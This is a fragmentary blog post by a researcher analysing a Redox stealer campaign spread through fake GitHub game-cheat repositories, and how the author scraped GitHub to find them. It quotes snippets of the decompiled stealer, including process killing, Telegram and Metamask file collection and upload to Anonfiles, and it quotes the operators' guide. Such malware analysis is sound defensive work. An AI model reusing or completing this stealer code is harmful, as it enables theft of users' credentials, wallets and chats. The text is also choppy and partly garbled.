The obfuscated code is a version of Redox stealer that searches for all valuable things on victims` computer and silently sends them to some Discord server. </li></ol><hr/><h3 id="some-background">Some background</h3><p>Recently I visited my &#34;Archive&#34; folder on Telegram to find an annoying channel I didn&#39;t want to unsubscribe from - and a message from a bot I used to use popped up at the top of the list with an eye-catching heading:</p><figure><img src="https://timsh.org/content/images/2025/02/Screenshot-2025-02-20-at-23.32.26.png" alt="" loading="lazy" width="1692" height="854" srcset="https://timsh.org/content/images/size/w600/2025/02/Screenshot-2025-02-20-at-23.32.26.png 600w, https://timsh.org/content/images/size/w1000/2025/02/Screenshot-2025-02-20-at-23.32.26.png 1000w, https://timsh.org/content/images/size/w1600/2025/02/Screenshot-2025-02-20-at-23.32.26.png 1600w, https://timsh.org/content/images/2025/02/Screenshot-2025-02-20-at-23.32.26.png 1692w" sizes="(min-width: 720px) 720px"/><figcaption><span> Translation: &#34;our theme on [redacted]: link deposit on [redacted]: $10k&#34;</span></figcaption></figure><p>A couple things before we start: </p><ol><li>This is a bot for ... checking TikTok videos for shadow bans (yes, they exist). </li><li>All the content in it is mostly in Russian, as well as lots of sources for this post. </li><li>I decided to redact some screenshots and not provide direct links to some sources because they contain highly immoral information and I don&#39;t want to spread it.

    pathC = path

    if not os.path.exists(pathC):
        return None
    None.Popen(f&#39;&#39;&#39;taskkill /im {procc} /t /f &gt;nul 2&gt;&amp;1&#39;&#39;&#39;, True, **(&#39;shell&#39;,))

    OtherZip.append([
        arg,
        lnik])</code></pre><p>This function kills Telegram process if it&#39;s running, collects the associated files (chat history, media, settings, tokens etc) and sends it to Anonfiles - a free and anonymous file sharing site, <a href="https://www.malwarebytes.com/blog/detections/anonfiles-com-2?ref=timsh.org" rel="noreferrer"><u>reported by some antivirus and malware detection</u></a> products as abused by criminals.</p><p>Next we have the ZipFiles - it&#39;s a long function that looks for specific things like Metamask wallet extension associated files, Steam loginusers.vdf file, containing user stream account info, Riot games accounts and more. </p><pre><code>if &#39;nkbihfbeogaeaoehlefnkodbefgpgknn&#39; in arg:

It even uses multithreading to collect the secrets faster. </p><p>The <code>uploadToAnonfiles(path)</code> function, by the way, suggests that this code is intentionally incomplete - possibly, to avoid malware activity detection by static analysis. Looks like the real functionality is injected on the go.</p><pre><code>def uploadToAnonfiles(path):

I quote: </p><blockquote>If you&#39;re motivated enough, you should create more topics and upload them. As you reach 300-500 uploaded repositories, 10-30 of which are on top - they will generate <strong>50-100+ logs daily</strong>. </blockquote><p>So there should be hundreds of these uploaded just by a single person - so, potentially, thousands or more in total. </p><h3 id="searching-on-github">Searching on Github</h3><p>I almost immediately came up with an idea - since I have an instruction for creating and choosing the topics provided by the author, I could try and search each of them and see if there are any repositories with such topics. </p><p>I tried it manually with 10 topics and was very excited to see that 10/10 included similar-looking repos with either README + .rar or just README with &#34;download&#34; link, leading to some shady file sharing service. </p><figure><img src="https://timsh.org/content/images/2025/02/Screenshot-2025-02-24-at-22.10.51.png" alt="" loading="lazy" width="1882" height="1866" srcset="https://timsh.org/content/images/size/w600/2025/02/Screenshot-2025-02-24-at-22.10.51.png 600w, https://timsh.org/content/images/size/w1000/2025/02/Screenshot-2025-02-24-at-22.10.51.png 1000w, https://timsh.org/content/images/size/w1600/2025/02/Screenshot-2025-02-24-at-22.10.51.png 1600w, https://timsh.org/content/images/2025/02/Screenshot-2025-02-24-at-22.10.51.png 1882w" sizes="(min-width: 720px) 720px"/></figure><h3 id="scraping-github">Scraping Github</h3><p>After just 30 minutes of manual searching I felt like it was an effective method, meaning that the possibility that a repository is / looks malicious if it has one of the mentioned topics is quite high. Which is why I decided to write a simple script that:</p><ol><li>Generates some simple topics using an instruction provided by the author - 1 base_keyword like csgo or fortnite + 1 topic_keyword like &#34;cheat&#34;, &#34;hack&#34;, &#34;aimbot&#34;, then 1 base + 2 topic_keyword, e.t.c</li><li>Searches for each of them on Github using a <code>topic:{topic}</code> query and saves all found repos to a single .csv. </li><li>Checks each found repository structure for being suspicious - even a single README or README + some files + .rar/.exe./.zip. </li></ol><p>For both base_keywords and topic_keywords I used lists  from the examples from the guide - as you can imagine, both of these could be expanded quite a lot, but I left them intentionally to see if even the simplest PoC would work:</p><pre><code>base_keywords = [
